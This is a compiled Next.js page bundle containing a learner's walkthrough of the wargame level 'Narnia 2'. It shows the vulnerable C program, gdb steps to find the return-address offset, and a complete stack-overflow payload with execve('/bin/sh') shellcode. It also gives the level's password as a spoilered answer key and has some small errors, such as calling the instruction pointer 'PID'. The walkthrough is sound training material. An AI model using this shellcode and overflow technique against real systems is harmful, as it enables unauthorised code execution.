(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[853],{15873:function(e,n,t){(window.__NEXT_P=window.__NEXT_P||[]).push(["/narnia/narnia2",function(){return t(29856)}])},90654:function(e,n,t){"use strict";var r=t(85893),o=t(23457),i=t.n(o),a=t(5227),f=t(84283);n.Z=function(e){var n=e.children,t=e.language;return(0,r.jsx)("div",{className:i().CodeBlock,children:(0,r.jsx)(a.Z,{language:t,style:f.cL,children:n})})}},87582:function(e,n,t){"use strict";var r=t(85893),o=t(76992),i=t.n(o);n.Z=function(e){var n=e.children;return(0,r.jsxs)("div",{className:i().keyword,children:[(0,r.jsx)("p",{className:i().keywordHead,children:"Keywords: "}),n]})}},69242:function(e,n,t){"use strict";var r=t(85893),o=t(41664),i=t(98574),a=t.n(i);n.Z=function(e){var n=e.link1,t=e.link2;return(0,r.jsxs)("div",{className:a().pageNav,children:[(0,r.jsx)("div",{children:n?(0,r.jsx)(o.default,{href:n,children:(0,r.jsx)("a",{title:"Previous page",className:a().navButton,children:"\u25c0"})}):""}),(0,r.jsx)("div",{children:t?(0,r.jsx)(o.default,{href:t,children:(0,r.jsx)("a",{title:"Next page",className:a().navButton,children:"\u25b6"})}):""})]})}},20586:function(e,n,t){"use strict";var r=t(85893),o=t(86655),i=t.n(o),a=t(5227),f=t(84283),s=t(67294);n.Z=function(e){var n=e.children,t=(0,s.useState)(!1),o=t[0],c=t[1];return(0,r.jsxs)("section",{children:[(0,r.jsx)("h2",{children:"Key"}),(0,r.jsxs)("div",{className:i().codeBlock,children:[(0,r.jsx)("div",{className:i().spoilerToggler,children:(0,r.jsx)("button",{onClick:function(){return c(!o)},children:"Click to Reveal"})}),(0,r.jsx)("div",{className:i().spoilerContainer,children:(0,r.jsx)("div",{className:"".concat(i().spoiler," ").concat(o?i().show:""),children:(0,r.jsx)(a.Z,{language:"",style:f.cL,customStyle:{margin:0},children:n})})})]})]})}},35934:function(e,n,t){"use strict";var r=t(85893),o=t(96979),i=t.n(o);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function f(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},i=Object.keys(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}n.Z=function(e){var n=e.children,t=f(e,["children"]);return(0,r.jsx)("span",function(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{},r=Object.keys(t);"function"===typeof Object.getOwnPropertySymbols&&(r=r.concat(Object.getOwnPropertySymbols(t).filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable})))),r.forEach((function(n){a(e,n,t[n])}))}return e}({className:i().tag},t,{children:n}))}},29856:function(e,n,t){"use strict";t.r(n);var r=t(85893),o=t(90654),i=t(87582),a=t(69242),f=t(20586),s=t(35934);n.default=function(){return(0,r.jsxs)("div",{children:[(0,r.jsx)("h1",{children:"Narnia 2"}),(0,r.jsxs)(i.Z,{children:[(0,r.jsx)(s.Z,{children:"shellcode"}),(0,r.jsx)(s.Z,{children:"buffer-overflow"}),(0,r.jsx)(s.Z,{children:"overwrite-registers"})]}),(0,r.jsxs)("section",{children:[(0,r.jsx)("h2",{children:"Experience"}),(0,r.jsxs)("p",{children:["Looking at the source code of Narnia 2, my initial thoughts is that this may be another difficult level. I notice the potential vulnerability from the function",(0,r.jsx)("code",{children:"strcpy"})," as it does not seem to check for the buffer's length. I believe I've used a function called ",(0,r.jsx)("code",{children:"strncpy"})," which does require the length of the buffer. Besides that however, I was unsure how I will be able to execute any payload as it simply prints out what's in the buffer."]}),(0,r.jsx)(o.Z,{language:"c",children:'int main(int argc, char * argv[]){\n    char buf[128];\n  \n    if(argc == 1){\n        printf("Usage: %s argument\\n", argv[0]);\n        exit(1);\n    }\n    strcpy(buf,argv[1]);\n    printf("%s", buf);\n  \n    return 0;\n}'}),(0,r.jsxs)("p",{children:["Searching on how to execute a command by exploiting a buffer overflow, I came upon this great instruction by Coen Goedegebure named ",(0,r.jsx)("a",{href:"https://www.coengoedegebure.com/buffer-overflow-attacks-explained/",children:"Buffer overflow attacks explained"}),". From this, I learnt that I had to overwrite one of the registers of the program, named EIP (extended Instruction Pointer) which points to the next instruction the program will execute. It also thought that we may know when we have overwritten the register when the program try to get the value from the pointer but obtained an invalid address."]}),(0,r.jsxs)("p",{children:["Using gdb, we gain access to viewing information register using",(0,r.jsx)("code",{children:"info registers"})," and also allow us to call the program repeatedly with ease, using ",(0,r.jsx)("code",{children:"r"})," followed by the argument we want the program to have. Incrementing from the size of the buffer itself, 128, 130, 140, it returned a segmentation fault at 140. Checking the register information, the EIP has indeed been overwritten. Next, we simply have to find the number of characters it actually took to overwrite the EIP. I discovered that it took 132 characters to reach EIP. The following command was used to proof this."]}),(0,r.jsx)(o.Z,{language:"shell",children:"r $(python -c \"print 'a' * 132 + 'b' *4\")"}),(0,r.jsxs)("p",{children:["Now, we simply have to inject a shellcode, and change the EIP pointer to the address of the shellcode. Now, we may inspect the memory address used by the program using ",(0,r.jsx)("code",{children:"x"}),"in gdb."]}),(0,r.jsx)(o.Z,{language:"",children:"x/200x $sp"}),(0,r.jsx)("p",{children:"The above code will print the memory per 200 byte blocks from the stackpointer. Searching for our injected characters, we found the following section."}),(0,r.jsx)(o.Z,{language:"",children:"0xffffd810:     0x00326169      0x61616161      0x61616161      0x61616161\n0xffffd820:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffd830:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffd840:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffd850:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffd860:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffd870:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffd880:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffd890:     0x61616161      0x61616161      0x62626262      0x5f434c00\n0xffffd8a0:     0x3d4c4c41      0x555f6e65      0x54552e53      0x00382d46\n0xffffd8b0:     0x435f534c      0x524f4c4f      0x73723d53      0x643a303d"}),(0,r.jsxs)("p",{children:['From this, we could clearly see the location of the injected "a" (which has a value of 61). The start of the buffer lies on the address',(0,r.jsx)("code",{children:"0xffffd814"}),", we could check this using ",(0,r.jsx)("code",{children:"x/s 0xffffd5b8"}),"or ",(0,r.jsx)("code",{children:"print((char *)0xffffd5b8"}),". Now, consider the shellcode from Narnia 1. The length of the shellcode was 24 bytes, therefore, we would only need 108 filler bytes, we will put nop (no operation) code which is ",(0,r.jsx)("code",{children:"\\90"}),' in assembly. We can already construct the full payload from this, simply change the "b"s to an address in the no op region, I\'ve chosen 0xffffd860']}),(0,r.jsx)(o.Z,{language:"",children:"r $(python -c \"print '\\x90'* 108 + '\\x6a\\x0b\\x58\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\xcd\\x80' + '\\x60\\xd8\\xff\\xff'\")"}),(0,r.jsx)("p",{children:"And the memory was looking like so. From here, we can see that, any address from 0xffffd814 (0xffffd80c + 8 bytes) should work, but this may not be the case outside of gdb, so we will still use 0xffffd860. This is in fact the point of the no-op, they act as a sled to move it to our shellcode. To read more, please do see the article by Coen Goedegebure mentioned above."}),(0,r.jsx)(o.Z,{language:"",children:"E(gdb) x/100x $sp+500\n0xffffd7ac:     0x00000017      0x00000001      0x00000019      0xffffd7eb\n0xffffd7bc:     0x0000001a      0x00000000      0x0000001f      0xffffdfe8\n0xffffd7cc:     0x0000000f      0xffffd7fb      0x00000000      0x00000000\n0xffffd7dc:     0x00000000      0x00000000      0x00000000      0xe9000000\n0xffffd7ec:     0x579d63ca      0x8b994914      0x406436df      0x694fbea3\n0xffffd7fc:     0x00363836      0x00000000      0x72616e2f      0x2f61696e\n0xffffd80c:     0x6e72616e      0x00326169      0x90909090      0x90909090\n0xffffd81c:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffd82c:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffd83c:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffd84c:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffd85c:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffd86c:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffd87c:     0x90909090      0x31580b6a      0x2f6856f6      0x6868732f\n0xffffd88c:     0x6e69622f      0xc931e389      0x80cdca89      0xffffd860"}),(0,r.jsx)("p",{children:"Now simply run the command outside of gdb, replacing the r with natas2."}),(0,r.jsx)(o.Z,{language:"",children:"./narnia2 $(python -c \"print '\\x90'* 108 + '\\x6a\\x0b\\x58\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\xcd\\x80' + '\\x60\\xd8\\xff\\xff'\")"})]}),(0,r.jsxs)("section",{children:[(0,r.jsx)("h2",{children:"Reflection"}),(0,r.jsx)("p",{children:"This was a very challenging level, we had to look deeply into the memory of the program itself and even then, the memory may not be the same when the program is actually ran outside of gdb. I noticed this as the lower memory address work inside gdb. The problem was the gdb is identified with the user narnia2, so the program must be ran outside. This was a source of confusion for quite some time."}),(0,r.jsx)("p",{children:"This level extended on the shellcode concept learnt from Narnia2, but this time, we are not given the luxury that the input is ran by the program by default. I learnt of PID, the register that points to the location of the next instruction which expanded the potential of using this type of attack. This taught me that, the vulnerability was a lot more dangerous as it can overwrite registers and basically change the control flow of the program as a whole."})]}),(0,r.jsx)(f.Z,{children:"vaequeezee"}),(0,r.jsx)(a.Z,{link1:"/narnia/narnia1",link2:""})]})}},23457:function(e){e.exports={CodeBlock:"CodeBlock_CodeBlock___IBBd"}},76992:function(e){e.exports={keywordHead:"Keyword_keywordHead__40fuD",keyword:"Keyword_keyword__javqt"}},98574:function(e){e.exports={pageNav:"PageNav_pageNav__NXqbT",navButton:"PageNav_navButton__yHhmO"}},86655:function(e){e.exports={codeBlock:"SpoilerKey_codeBlock__KWl0d",spoilerToggler:"SpoilerKey_spoilerToggler__HCeWZ",spoiler:"SpoilerKey_spoiler__YWx_s",show:"SpoilerKey_show__VIJ75",spoilerContainer:"SpoilerKey_spoilerContainer__O76It"}},96979:function(e){e.exports={tag:"Tag_tag__AJnTY"}}},function(e){e.O(0,[369,774,888,179],(function(){return n=15873,e(e.s=n);var n}));var n=e.O();_N_E=n}]);